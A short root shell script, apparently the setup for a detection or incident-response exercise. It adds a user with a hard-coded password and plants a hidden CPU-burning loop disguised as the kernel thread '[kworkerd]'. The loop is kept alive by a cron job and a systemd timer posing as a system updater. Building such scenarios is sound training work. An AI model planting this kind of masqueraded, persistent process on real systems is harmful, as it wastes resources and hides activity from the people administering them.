useradd -m -s /bin/bash pedro
echo 'pedro:Pedro.2021' | chpasswd
mkdir -p /home/pedro/.cache/.x
cat > /home/pedro/.cache/.x/actualizar <<'EOF'
#!/bin/bash
# "Actualizador". Gasta CPU sin parar con un nombre que parece del kernel. Sólo una copia a la vez.
exec 9>/tmp/.x.lock
flock -n 9 || exit 0
exec -a '[kworkerd]' nice -n 19 bash -c 'while :; do i=0; while [ $i -lt 30000 ]; do i=$((i+1)); done; sleep 0.3; done'
EOF
chmod +x /home/pedro/.cache/.x/actualizar
chown -R pedro:pedro /home/pedro/.cache
echo '* * * * * /home/pedro/.cache/.x/actualizar >/dev/null 2>&1' | crontab -u pedro -
cat > /etc/systemd/system/actualizador-sistema.service <<'EOF'
[Unit]
Description=Actualizador del sistema
[Service]
User=pedro
ExecStart=/home/pedro/.cache/.x/actualizar
EOF
cat > /etc/systemd/system/actualizador-sistema.timer <<'EOF'
[Unit]
Description=Actualizador del sistema
[Timer]
OnBootSec=30s
OnUnitActiveSec=1min
[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload
systemctl enable -q --now actualizador-sistema.timer
runuser -u pedro -- setsid /home/pedro/.cache/.x/actualizar </dev/null >/dev/null 2>&1 &
sleep 1
